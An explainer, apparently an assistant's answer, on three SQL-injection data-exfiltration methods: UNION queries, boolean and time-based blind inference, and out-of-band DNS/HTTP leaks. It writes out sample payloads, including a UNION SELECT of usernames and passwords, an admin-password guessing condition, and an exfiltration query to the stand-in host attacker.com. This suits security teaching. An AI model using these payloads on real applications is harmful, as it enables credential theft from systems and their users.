At a high level, extracting information via SQL injection exploits the application's database connection as a "question-answering machine" that you can hijack. You give it a disguised instruction, and its response—or lack thereof—leaks confidential data.

Here are the three main conceptual approaches, moving from a talkative application to a completely silent one.

---

### 1. Direct Exfiltration via Union Queries
This is the easiest scenario. The application is designed to show the results of a query directly on the page (like a list of products). The attacker's goal is to piggyback extra data onto this legitimate output.

- **The Trick:** The attacker crafts an input that closes the original query's `WHERE` clause and appends a `UNION SELECT` statement. This second statement fetches secret data from another table entirely.
- **Scenario:** A product search URL uses `?id=`. An attacker changes it to `?id=1 UNION SELECT username, password FROM Users--`. The web page, expecting to show a product name and price, is now fooled into displaying a list of usernames and their passwords instead.

---

### 2. Blind Exfiltration (The 20 Questions Method)
If the application doesn't display raw data in the UI, the attacker can't use the `UNION` trick. However, they can still extract information by asking the database a series of carefully crafted "Yes/No" questions.

- **The Trick:** The attacker injects a conditional statement into the query. By observing a difference in the application's response, they can deduce the answer. This turns the database into an oracle that leaks data one bit at a time.
- **Scenario (Boolean-Based):** In a URL, an attacker injects a true condition like `... AND 1=1`. The profile page loads normally. They then inject a false one: `... AND 1=2`. The page breaks or shows a "Not Found" error. Now, they inject a question: `... AND (SELECT SUBSTRING(password,1,1) FROM Users WHERE username='admin') = 'a'`. If the page loads normally, the first letter of the admin password is 'a'. If it breaks, they guess the next letter. A script automates this loop to extract the entire password.
- **Scenario (Time-Based):** If the application's visual response is identical for both a true and false condition, the attacker can use time as their signal. They inject `... IF (condition is true) WAITFOR DELAY '00:00:05'`. The attacker simply times the response; a 5-second delay means the guessed condition was true. Each delay reveals a tiny piece of information, like one character of a secret.

---

### 3. Out-of-Band Exfiltration (Forcing a Phone Call)
When the application is a complete black box with no visual or time-based feedback, the attacker can still get the information by making the database server itself send the secret data directly to the attacker's own system.

- **The Trick:** The injected command forces the database to perform an action that involves the secret data and an external server controlled by the attacker.
- **Scenario:** The attacker injects a command that tells the database server to make a DNS lookup or an HTTP request. The payload is crafted so that the secret data is embedded in the request's domain name, like `SELECT password||'.attacker.com' FROM Users`. The database, faithfully executing its instructions, makes a connection to retrieve `hackedPassword123.attacker.com`. The attacker simply checks the access logs on their own server to find the password.
